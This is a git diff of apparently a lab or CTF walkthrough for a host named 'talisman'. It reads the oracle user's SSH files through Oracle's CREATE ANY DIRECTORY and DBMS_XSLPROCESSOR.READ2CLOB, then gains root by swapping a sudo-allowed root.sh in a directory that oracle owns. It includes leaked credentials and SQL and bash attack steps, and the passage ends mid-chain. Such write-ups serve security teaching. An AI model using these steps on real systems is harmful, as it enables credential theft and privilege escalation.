@@ -80,15 +80,11 @@ Authenticating with the leaked credentials (`jane / Greattalisman1!true`) succee
 
 ### Enumerating Oracle DB Privileges
 
-Opening the SQL editor and querying the current session confirms our database identity:
+CloudBeaver's session panel confirms we are connected as database user `DEV`.
 
-```sql
-SELECT * FROM user_sys_privs;
-```
+![CloudBeaver — active session confirms DB user DEV](../.gitbook/assets/talisman_cloudbeaver_db_user.png)
 
-![Oracle — user_sys_privs confirms DEV is connected and holds direct privilege grants](../.gitbook/assets/talisman_cloudbeaver_db_user.png)
-
-We are connected as `DEV`. Next we enumerate what this session can actually do right now — including anything inherited via roles:
+We open the SQL editor and enumerate the effective privilege set — everything active in this session, including role-based grants:
 
 ```sql
 SELECT * FROM session_privs;
@@ -96,7 +92,7 @@ SELECT * FROM session_privs;
 
 ![Oracle — session_privs reveals CREATE ANY DIRECTORY and DROP ANY DIRECTORY](../.gitbook/assets/talisman_session_privs.png)
 
-The output includes `CREATE ANY DIRECTORY` and `DROP ANY DIRECTORY` in the effective privilege set. We verify these are direct grants rather than role-based:
+The output includes `CREATE ANY DIRECTORY` and `DROP ANY DIRECTORY`. We verify these are granted directly to `DEV` rather than inherited via a role:
 
 ```sql
 SELECT * FROM user_sys_privs;
@@ -104,14 +100,14 @@ SELECT * FROM user_sys_privs;
 
 ![Oracle — user_sys_privs confirms direct grants to DEV](../.gitbook/assets/talisman_user_sys_privs.png)
 
-Both are granted directly to `DEV`. This is significant: `CREATE ANY DIRECTORY` lets us create an Oracle **Directory Object** — a label inside the database engine that maps an arbitrary name to a real filesystem path on the underlying server. Oracle uses these for export/import operations, but they are backed by the OS-level permissions of the process running the Oracle instance — typically the `oracle` OS account. That means a directory object pointing at `/home/oracle/.ssh` lets us read files as that OS user.
+Both are direct grants. This is significant: `CREATE ANY DIRECTORY` lets us create an Oracle **Directory Object** — a label inside the database engine that maps an arbitrary name to a real filesystem path on the underlying server. Oracle uses these for export/import operations, but they are backed by the OS-level permissions of the process running the Oracle instance — typically the `oracle` OS account. A directory object pointing at `/home/oracle/.ssh` lets us read files as that OS user.
 
 ### Oracle File Read via CREATE ANY DIRECTORY + DBMS_XSLPROCESSOR
 
 The attack chain exploits two Oracle primitives together:
 
 1. **`CREATE DIRECTORY`** — creates a named alias to any path the oracle OS user can reach
-2. **`DBMS_XSLPROCESSOR.READ2CLOB`** — a function designed for reading XML/XSLT content, but with no validation of the file type; it reads any file at the given path and returns it as a CLOB
+2. **`DBMS_XSLPROCESSOR.READ2CLOB`** — a function designed for reading XML/XSLT content, but with no file type validation; it reads any file at the given path and returns it as a CLOB
 
 ```sql
 CREATE DIRECTORY MY_DIR AS '/home/oracle/.ssh';
@@ -196,7 +192,7 @@ User oracle may run the following commands on talisman:
     (ALL) NOPASSWD: /opt/oracle/product/21c/dbhomeXE/root.sh
 ```
 
-`oracle` can execute `root.sh` as root with no password. Running it as-is only produces a log file accessible to root. The critical question is: who owns the directory the script lives in?
+`oracle` can execute `root.sh` as root with no password. Running it as-is only produces a log file readable only by root. The critical question is: who owns the directory the script lives in?
 
 ```bash
 ls -la /opt/oracle/product/21c/dbhomeXE/ | head -5
@@ -210,7 +206,7 @@ drwxrwxr-x.  3 oracle oinstall    22 Sep  4  2025 ..
 -rwx------.  1 root   oinstall   507 Aug 18  2021 root.sh
 ```
 
-The file `root.sh` is owned by root — but `oracle` owns the parent directory `dbhomeXE/` with write permission (`drwxrwxr-x`). On Linux, directory ownership is what controls the ability to **rename** or **delete** entries within that directory, regardless of what the files themselves are owned by. Since `oracle` owns the parent, we can rename the original `root.sh` out of the way and place our own script at that path. Sudo will then execute our version as root.
+The file `root.sh` is owned by root — but `oracle` owns the parent directory `dbhomeXE/` with write permission (`drwxrwxr-x`). On Linux, directory ownership controls the ability to **rename** or **delete** entries within that directory, regardless of what the files themselves are owned by. Since `oracle` owns the parent, we can rename the original `root.sh` out of the way and place our own script at that exact path. Sudo will then execute our version as root.
 
 ```bash
 mv /opt/oracle/product/21c/dbhomeXE/root.sh /opt/oracle/product/21c/dbhomeXE/root-old.sh
